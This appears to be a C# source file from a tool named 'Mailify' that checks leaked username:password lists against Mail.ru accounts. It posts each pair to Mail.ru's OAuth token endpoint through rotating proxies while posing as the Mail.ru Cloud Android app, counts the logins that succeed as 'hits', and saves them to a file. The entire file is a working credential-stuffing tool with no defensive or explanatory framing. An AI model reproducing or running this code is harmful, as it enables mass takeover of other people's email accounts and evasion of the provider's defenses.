using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Mail_ru
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    request.UserAgent = "User-Agent: Android 3.14.18.9202 5.1.1:SM-A530F:ru.mail.cloud::null";
                    request.AddHeader("Pragma", "no-cache");
                    request.AddHeader("Accept", "*/*");
                    string str = "password=" + credentials[1] + "&client_id=cloud-android&username=" + credentials[0] + "&grant_type=password";
                    string strResponse = request.Post("https://o2.mail.ru/token", str, "application/x-www-form-urlencoded").ToString();
                    {
                        if (strResponse.Contains("username or password is incorrect"))
                        {
                            Variables.Invalid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                            }
                        }
                        else if (strResponse.Contains("access_token"))
                        {
                            Variables.Valid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                if (Config.kekr_UI == "LOG")
                                {
                                    Console.WriteLine($"[+] {combo}", Color.Green);
                                }
                                File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                            }

                        }
                        else
                        {
                            Variables.combos.Enqueue(combo);
                            Variables.proxyIndex++;
                            Variables.Errors++;
                        }

                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}